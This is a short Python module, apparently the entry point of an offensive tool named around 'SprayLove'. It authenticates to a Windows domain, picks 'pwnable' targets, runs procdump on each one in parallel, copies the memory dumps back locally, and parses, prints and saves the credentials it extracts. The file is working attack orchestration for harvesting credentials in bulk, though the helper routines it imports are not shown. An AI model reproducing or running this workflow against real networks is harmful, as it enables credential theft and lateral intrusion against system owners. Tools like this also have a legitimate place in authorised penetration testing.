# coding: utf-8

# Author:	Lyderic LEFEBVRE
# Twitter:	@lydericlefebvre
# Mail:		lylefebvre.infosec@gmail.com
# LinkedIn:	https://www.linkedin.com/in/lydericlefebvre


# Imports
import logging, queue
from core.User import *
from core.Resources import *
from core.Targets import *
from core.SprayLove import *
from core.ParseDump import *
from core.Colors import *
from core.Utils import *
from core.PrintCreds import *
from core.WriteCreds import *
from multiprocessing import Process

def run(args):
    jobs = []

    user = User(args.domain, args.username, args.password)
    local_ip = retrieveMyIP()

    try:
        targets = listPwnableTargets(args.targets, user)
        
        logging.warning("%sExec procdump on targets, and retrieve dumps locally into %smisc/dumps%s. Be patients..." % (warningGre, green, white))

        for target in targets:
            jobs.append(Process(target=sprayLove, args=(user, target, local_ip)))
            jobs[-1].start()
        
        joinThreads(jobs, 1200) # wait 20 minutes max
        credentials = parseDumps(dumpDir)

        if credentials is not None:
            print_credentials(credentials)
            write_credentials(credentials)
    except KeyboardInterrupt:
        logging.warning("%sKeyboard interrupt. Exiting." % (warningRed))
    except Exception as e:
        logging.warning("%sErr: %s" % (warningRed, e))
    finally:
        exit_gracefully(jobs, 10, args.keep)
